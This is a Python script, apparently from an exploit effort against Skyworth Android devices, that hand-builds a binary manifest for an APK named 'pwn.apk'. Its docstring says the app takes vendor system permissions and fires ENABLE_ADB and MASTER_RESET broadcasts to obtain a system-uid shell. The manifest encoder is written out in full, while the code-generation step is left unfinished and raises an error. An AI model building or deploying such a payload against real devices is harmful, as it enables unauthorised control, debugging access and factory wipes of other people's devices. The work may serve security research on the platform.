#!/usr/bin/env python3
"""Minimal binary-AXML manifest encoder + tiny APK builder (no aapt needed).
Produces /tmp/apk/pwn.apk: com.omp.pwn with Skyworth sysctl permissions +
MainActivity that fires ENABLE_ADB / MASTER_RESET broadcasts and dumps
uid-1000 shell out."""
import struct, zipfile, zlib

ANS = 'http://schemas.android.com/apk/res/android'

RES = {  # android attr resource ids
    'versionCode': 0x0101021b,
    'versionName': 0x0101021c,
    'name': 0x01010003,
    'label': 0x01010001,
    'exported': 0x01010010,
    'permission': 0x01010006,
}

class StrPool:
    def __init__(self):
        self.strings, self.index = [], {}
    def add(self, s):
        if s not in self.index:
            self.index[s] = len(self.strings)
            self.strings.append(s)
        return self.index[s]
    def get(self, s):
        return self.index[s]
    def build(self):
        data, offsets = b'', []
        for s in self.strings:
            offsets.append(len(data))
            data += struct.pack('<H', len(s)) + s.encode('utf-16-le') + b'\x00\x00'
        while len(data) % 4:
            data += b'\x00'
        offs_b = b''.join(struct.pack('<I', o) for o in offsets)
        size = 28 + len(offs_b) + len(data)
        hdr = struct.pack('<HHIIIIII', 0x0001, 28, size,
                          len(self.strings), 0, 0, 28 + len(offs_b), 0)
        return hdr + offs_b + data

def start_el(pool, ns, name, attrs):
    body = b''
    for (ans, aname, araw, atype, adata) in attrs:
        ns_i = pool.get(ans) if ans else -1
        raw_i = pool.get(araw) if isinstance(araw, str) else -1
        body += struct.pack('<iii',
                            pool.get(ans) if ans else -1,
                            pool.get(aname),
                            raw_i)
        body += struct.pack('<HBBI', 8, 0, atype >> 24, adata)
    ns_i = pool.get(ns) if ns else -1
    fixed = struct.pack('<iiHHHHHH', ns_i, pool.get(name),
                        20, 20, len(attrs), 0, 0, 0)
    size = len(fixed) + len(body) + 16
    return struct.pack('<HHIII', 0x0102, 16, size, 0xFFFFFFFF, 0xFFFFFFFF) + fixed + body

def end_el(pool, ns, name):
    ns_i = pool.get(ns) if ns else -1
    return struct.pack('<HHIIIii', 0x0103, 16, 24, 0xFFFFFFFF, 0xFFFFFFFF,
                       ns_i, pool.get(name))

def build_axml(pkg, permissions, activity, actions, receiver=None):
    pool = StrPool()
    ANS_I = pool.add('android')
    pool.add(ANS)
    A = ANS_I
    _pre = ['manifest','uses-permission','application','activity',
            'intent-filter','action','category','package','versionCode',
            'versionName','name','label','exported', pkg, activity,
            'pwn','1','1.0','android.intent.action.MAIN',
            'android.intent.category.LAUNCHER'] + list(permissions) + list(actions)
    if receiver:
        _pre += ['receiver', receiver[0]] + list(receiver[1])
    for s in _pre:
        pool.add(s)
    chunks = [struct.pack('<HHIIIii', 0x0100, 16, 24, 0xFFFFFFFF, 0xFFFFFFFF, -1, pool.get(ANS))]
    chunks.append(start_el(pool, None, 'manifest', [
        (None, 'package', pkg, 0x03000008, pool.get(pkg)),
        (ANS, 'versionCode', None, 0x10000001, 1),
        (ANS, 'versionName', '1.0', 0x03000008, pool.get('1.0')),
    ]))
    for p in permissions:
        chunks.append(start_el(pool, None, 'uses-permission',
                               [(ANS, 'name', p, 0x03000008, pool.get(p))]))
        chunks.append(end_el(pool, None, 'uses-permission'))
    chunks.append(start_el(pool, None, 'application',
                           [(ANS, 'label', 'pwn', 0x03000008, pool.get('pwn'))]))
    chunks.append(start_el(pool, None, 'activity', [
        (ANS, 'name', activity, 0x03000008, pool.get(activity)),
        (ANS, 'exported', None, 0x12000000, 0xFFFFFFFF),
    ]))
    chunks.append(start_el(pool, None, 'intent-filter', []))
    for a in actions:
        chunks.append(start_el(pool, None, 'action',
                               [(ANS, 'name', a, 0x03000008, pool.get(a))]))
        chunks.append(end_el(pool, None, 'action'))
    chunks.append(end_el(pool, None, 'intent-filter'))
    chunks.append(end_el(pool, None, 'activity'))
    if receiver:
        rname, ractions = receiver
        chunks.append(start_el(pool, None, 'receiver', [
            (ANS, 'name', rname, 0x03000008, pool.get(rname)),
            (ANS, 'exported', None, 0x12000000, 0xFFFFFFFF),
        ]))
        chunks.append(start_el(pool, None, 'intent-filter', []))
        for a in ractions:
            chunks.append(start_el(pool, None, 'action',
                                   [(ANS, 'name', a, 0x03000008, pool.get(a))]))
            chunks.append(end_el(pool, None, 'action'))
        chunks.append(end_el(pool, None, 'intent-filter'))
        chunks.append(end_el(pool, None, 'receiver'))
    chunks.append(end_el(pool, None, 'application'))
    chunks.append(end_el(pool, None, 'manifest'))
    chunks.append(struct.pack('<HHIIIii', 0x0101, 16, 24, 0xFFFFFFFF, 0xFFFFFFFF, -1, pool.get(ANS)))
    body = b''.join(chunks)
    spool = pool.build()
    n = len(pool.strings)
    # resource map: attr-name string index -> android resid
    res_ids = []
    for s in pool.strings:
        res_ids.append(RES.get(s, 0))
    rchunk = struct.pack('<HHI', 0x0180, 8, 8 + 4*n) + \
             b''.join(struct.pack('<I', r) for r in res_ids)
    total = 8 + len(spool) + len(rchunk) + len(body)
    return struct.pack('<HHI', 0x0003, 8, total) + spool + rchunk + body

def build_classes_dex():
    # Hand-assembled minimal DEX with MainActivity.onCreate that:
    #  sendBroadcast(ENABLE_ADB status=true), (ENABLE_FORCESTOP status=true)
    # We generate dalvik bytecode by hand (constants + invoke ranges).
    # Simpler: reuse an existing classes.dex from SkyUsbNotify (has no MainActivity we need)
    # NO - must be our package. We craft a minimal dex via python 'dex builder' - long.
    # ALTERNATIVE: apk with only receivers needs no dex... but our activity needs code.
    # Instead: register a RECEIVER (no code needed - manifest-only can't run logic).
    # A receiver must BE a class. So we need dex. Use a pre-built generic dex template
    # with constant strings? We'll generate dalvik via 'dexlib'? Keep it simple:
    # craft tiny class manually (we control every byte).
    raise NotImplementedError

if __name__ == '__main__':
    print('use build_apk.py')
